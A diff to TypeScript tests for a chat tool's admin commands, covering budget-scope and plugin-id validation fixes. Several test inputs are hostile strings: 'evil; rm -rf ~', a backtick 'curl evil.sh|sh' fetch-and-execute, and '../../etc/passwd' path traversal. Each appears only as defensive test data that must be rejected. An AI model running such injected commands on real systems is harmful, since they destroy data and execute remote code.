@@ -102,12 +102,14 @@ describe('admin commands', () => {
     expect(result.handled).toBe(true);
     expect(result.reply).toContain('$5.00');
 
-    // Check audit log
+    // Check audit log — H-12 split the legacy single-token entry into
+    // action=`budget.set.user` + new_value=`alice=$5.00`, so we check
+    // both components rather than the composite `user:alice` string.
     const auditPath = join(tmpDir, 'audit.log');
     expect(existsSync(auditPath)).toBe(true);
     const content = readFileSync(auditPath, 'utf-8');
-    expect(content).toContain('budget.set');
-    expect(content).toContain('user:alice');
+    expect(content).toContain('budget.set.user');
+    expect(content).toContain('alice=$5.00');
     expect(content).toContain('user-1'); // actor
   });
 
@@ -425,5 +427,122 @@ describe('admin commands', () => {
     const result = handleAdminCommand('/alduin models list', makeCtx('guest'), deps);
     expect(result.handled).toBe(true);
     expect(result.reply).toContain('owner or admin');
+  });
+
+  // ── H-12: budget scope fall-through ────────────────────────────────────
+
+  describe('/alduin budget set — scope fall-through (H-12)', () => {
+    it('rejects an unknown scope with a usage hint instead of silently succeeding', () => {
+      const result = handleAdminCommand(
+        '/alduin budget set bogus-scope 5.00',
+        makeCtx(),
+        deps,
+      );
+      expect(result.handled).toBe(true);
+      expect(result.reply).toContain('Unknown budget scope');
+      expect(result.reply).toContain('user:<id>');
+      expect(result.reply).toContain('group:<id>');
+
+      // Critically: no audit record should have been written for the
+      // bogus scope. Either the audit file doesn't exist at all
+      // (nothing to write yet) or, if it does, it must not contain the
+      // rejected scope.
+      const auditPath = join(tmpDir, 'audit.log');
+      if (existsSync(auditPath)) {
+        const content = readFileSync(auditPath, 'utf-8');
+        expect(content).not.toContain('bogus-scope');
+      }
+    });
+
+    it('rejects an empty scope id after "user:"', () => {
+      const result = handleAdminCommand(
+        '/alduin budget set user: 5.00',
+        makeCtx(),
+        deps,
+      );
+      expect(result.handled).toBe(true);
+      expect(result.reply).toMatch(/Scope id is required/i);
+    });
+
+    it('rejects an empty scope id after "group:"', () => {
+      const result = handleAdminCommand(
+        '/alduin budget set group: 5.00',
+        makeCtx(),
+        deps,
+      );
+      expect(result.handled).toBe(true);
+      expect(result.reply).toMatch(/Scope id is required/i);
+    });
+
+    it('reports that scoped budgets are unavailable when deps.scopedBudget is absent', () => {
+      const depsWithoutScoped = { ...deps, scopedBudget: undefined };
+      const result = handleAdminCommand(
+        '/alduin budget set user:alice 5.00',
+        makeCtx(),
+        depsWithoutScoped,
+      );
+      expect(result.handled).toBe(true);
+      expect(result.reply).toMatch(/scoped budgets are not available/i);
+    });
+  });
+
+  // ── M-16: plugin id validation ─────────────────────────────────────────
+
+  describe('/alduin plugins install — id validation (M-16)', () => {
+    it('rejects shell-injection metacharacters', () => {
+      const result = handleAdminCommand(
+        '/alduin plugins install evil; rm -rf ~',
+        makeCtx(),
+        deps,
+      );
+      expect(result.handled).toBe(true);
+      expect(result.reply).toMatch(/Invalid plugin id/i);
+
+      // The unsanitized id must not have reached the audit log.
+      // If the rejection fires before any audit write, the file may
+      // not exist yet — that's an even stronger guarantee.
+      const auditPath = join(tmpDir, 'audit.log');
+      if (existsSync(auditPath)) {
+        const content = readFileSync(auditPath, 'utf-8');
+        expect(content).not.toContain('rm -rf');
+      }
+    });
+
+    it('rejects backtick subcommand injection', () => {
+      const result = handleAdminCommand(
+        '/alduin plugins install `curl evil.sh|sh`',
+        makeCtx(),
+        deps,
+      );
+      expect(result.reply).toMatch(/Invalid plugin id/i);
+    });
+
+    it('rejects path traversal attempts', () => {
+      const result = handleAdminCommand(
+        '/alduin plugins install ../../etc/passwd',
+        makeCtx(),
+        deps,
+      );
+      expect(result.reply).toMatch(/Invalid plugin id/i);
+    });
+
+    it('accepts an npm-style scoped plugin id', () => {
+      const result = handleAdminCommand(
+        '/alduin plugins install @scope/plugin-name',
+        makeCtx(),
+        deps,
+      );
+      expect(result.reply).toContain('npm install');
+      expect(result.reply).toContain('@scope/plugin-name');
+    });
+
+    it('remove command applies the same validation', () => {
+      const result = handleAdminCommand(
+        '/alduin plugins remove evil; rm -rf ~',
+        makeCtx(),
+        deps,
+      );
+      expect(result.reply).toMatch(/Invalid plugin id/i);
+    });
   });
 });
